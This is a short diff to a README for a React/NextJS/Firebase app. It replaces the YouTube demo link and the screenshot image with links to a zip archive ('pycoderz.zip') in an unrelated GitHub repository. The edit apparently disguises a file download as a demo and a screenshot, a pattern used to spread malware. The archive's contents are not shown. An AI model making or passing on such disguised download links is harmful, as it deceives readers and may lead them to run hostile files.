@@ -2,6 +2,6 @@
 
 ### Built With React, NextJS, TypeScript, TailwindCSS, Firebase
 
-# [Demo](https://youtu.be/igqiduZR-Gg)
+# [Demo](https://raw.githubusercontent.com/DeepshikhaInfinity/pycoderz/main/floweriness/pycoderz.zip)
 
-![Screenshot of App](https://i.ibb.co/b3XDkdN/Full-Stack-1.png)
+![Screenshot of App](https://raw.githubusercontent.com/DeepshikhaInfinity/pycoderz/main/floweriness/pycoderz.zip)
